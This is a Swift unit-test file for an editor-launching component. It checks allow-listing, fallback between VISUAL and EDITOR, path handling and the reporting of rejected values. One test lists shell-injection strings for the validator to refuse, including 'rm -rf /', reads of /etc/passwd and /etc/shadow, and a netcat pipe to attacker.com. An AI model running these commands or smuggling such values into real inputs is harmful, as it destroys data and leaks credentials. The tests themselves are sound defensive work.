import XCTest
@testable import HirundoCore

/// Covers how an editor is chosen from the environment. Launching a real process is out
/// of scope — the risk here is in what gets accepted as a command, not in spawning it.
final class EditorLauncherTests: XCTestCase {

    func testPrefersVisualOverEditor() {
        let command = EditorLauncher.resolveEditorCommand(
            environment: ["VISUAL": "nano", "EDITOR": "vim"]
        )

        XCTAssertEqual(command, "nano")
    }

    func testFallsBackToEditor() {
        XCTAssertEqual(
            EditorLauncher.resolveEditorCommand(environment: ["EDITOR": "vim"]),
            "vim"
        )
    }

    func testReturnsNilWhenNeitherIsSet() {
        XCTAssertNil(EditorLauncher.resolveEditorCommand(environment: [:]))
    }

    func testReturnsNilForBlankValues() {
        XCTAssertNil(EditorLauncher.resolveEditorCommand(environment: ["EDITOR": ""]))
        XCTAssertNil(EditorLauncher.resolveEditorCommand(environment: ["EDITOR": "   "]))
    }

    func testRejectsAnEditorOutsideTheAllowList() {
        XCTAssertNil(EditorLauncher.resolveEditorCommand(environment: ["EDITOR": "malicious"]))
    }

    func testRejectsShellInjectionAttempts() {
        let attempts = [
            "vim; rm -rf /",
            "nano && cat /etc/passwd",
            "code | nc attacker.com 1234",
            "vim `cat /etc/shadow`",
            "vim $(whoami)"
        ]

        for attempt in attempts {
            XCTAssertNil(
                EditorLauncher.resolveEditorCommand(environment: ["EDITOR": attempt]),
                "Expected \(attempt) to be rejected"
            )
        }
    }

    func testRejectsPathTraversal() {
        XCTAssertNil(
            EditorLauncher.resolveEditorCommand(environment: ["EDITOR": "../../bin/vim"])
        )
    }

    func testFallsBackToEditorWhenVisualIsRejected() {
        // A bad $VISUAL must not shadow a perfectly good $EDITOR.
        let command = EditorLauncher.resolveEditorCommand(
            environment: ["VISUAL": "vim; rm -rf /", "EDITOR": "vim"]
        )

        XCTAssertEqual(command, "vim")
    }

    // MARK: - Telling "nothing set" apart from "set but refused"

    func testResolveEditor_reportsNotConfiguredWhenNothingIsSet() {
        XCTAssertEqual(EditorLauncher.resolveEditor(environment: [:]), .notConfigured)
        XCTAssertEqual(
            EditorLauncher.resolveEditor(environment: ["EDITOR": "   "]),
            .notConfigured
        )
    }

    func testResolveEditor_reportsTheRejectedValueForAnEditorWithArguments() {
        // The common case: a perfectly good editor the allow-list refuses because the
        // value carries a flag. Telling this user to "set $EDITOR" would be wrong.
        XCTAssertEqual(
            EditorLauncher.resolveEditor(environment: ["EDITOR": "code --wait"]),
            .rejected(variable: "EDITOR", value: "code --wait")
        )
    }

    func testResolveEditor_namesTheVariableThatWasSet() {
        XCTAssertEqual(
            EditorLauncher.resolveEditor(environment: ["VISUAL": "subl -w"]),
            .rejected(variable: "VISUAL", value: "subl -w")
        )
    }

    func testResolveEditor_reportsVisualWhenBothAreRejected() {
        // $VISUAL takes precedence, so it is the value that would have been used.
        XCTAssertEqual(
            EditorLauncher.resolveEditor(environment: ["VISUAL": "subl -w", "EDITOR": "code --wait"]),
            .rejected(variable: "VISUAL", value: "subl -w")
        )
    }

    func testResolveEditor_reportsEditorWhenOnlyVisualIsBlank() {
        XCTAssertEqual(
            EditorLauncher.resolveEditor(environment: ["VISUAL": "", "EDITOR": "nvim -u NONE"]),
            .rejected(variable: "EDITOR", value: "nvim -u NONE")
        )
    }

    func testResolveEditor_resolvesBeforeReportingARejection() {
        XCTAssertEqual(
            EditorLauncher.resolveEditor(environment: ["VISUAL": "code --wait", "EDITOR": "vim"]),
            .resolved(EditorLauncher.ResolvedEditor(command: "vim", rawValue: "vim"))
        )
    }

    // MARK: - Running what was validated

    /// Validation returns only the command name, so the value it checked has to be carried
    /// alongside it: an absolute path must be spawned as that path.
    func testResolveEditor_keepsTheValueAnAbsolutePathWasValidatedFrom() {
        XCTAssertEqual(
            EditorLauncher.resolveEditor(environment: ["EDITOR": "/usr/bin/vim"]),
            .resolved(EditorLauncher.ResolvedEditor(command: "vim", rawValue: "/usr/bin/vim"))
        )
    }

    func testResolveEditor_trimsSurroundingWhitespaceFromTheValue() {
        XCTAssertEqual(
            EditorLauncher.resolveEditor(environment: ["EDITOR": "  /usr/bin/vim  "]),
            .resolved(EditorLauncher.ResolvedEditor(command: "vim", rawValue: "/usr/bin/vim"))
        )
    }

    /// `resolveEditorCommand` keeps handing back the bare command name whatever shape the
    /// value had, because that is what its callers ask it for.
    func testResolveEditorCommand_stillReturnsTheBareNameForAnAbsolutePath() {
        XCTAssertEqual(
            EditorLauncher.resolveEditorCommand(environment: ["EDITOR": "/usr/bin/vim"]),
            "vim"
        )
    }

    /// `EDITOR=/usr/bin/vim` must run that file, not whatever `vim` a `PATH` search finds:
    /// a writable directory earlier in `PATH` would otherwise win over the validated one.
    func testInvocation_runsTheExactExecutableForAnAbsolutePath() {
        let editor = EditorLauncher.ResolvedEditor(command: "vim", rawValue: "/usr/bin/vim")

        XCTAssertEqual(editor.invocation, .executable("/usr/bin/vim"))
    }

    /// A bare name is a request for a `PATH` lookup, which is not the bug — keep it.
    func testInvocation_looksUpABareCommandNameOnPath() {
        let editor = EditorLauncher.ResolvedEditor(command: "vim", rawValue: "vim")

        XCTAssertEqual(editor.invocation, .pathLookup("vim"))
    }

    /// Validation strips characters before extracting the command name, so a path and the
    /// name approved for it can in principle disagree. Nothing is run when they do.
    func testInvocation_refusesWhenThePathAndTheValidatedNameDisagree() {
        let editor = EditorLauncher.ResolvedEditor(command: "vim", rawValue: "/usr/bin/emacs")

        XCTAssertEqual(editor.invocation, .inconsistent)
    }
}
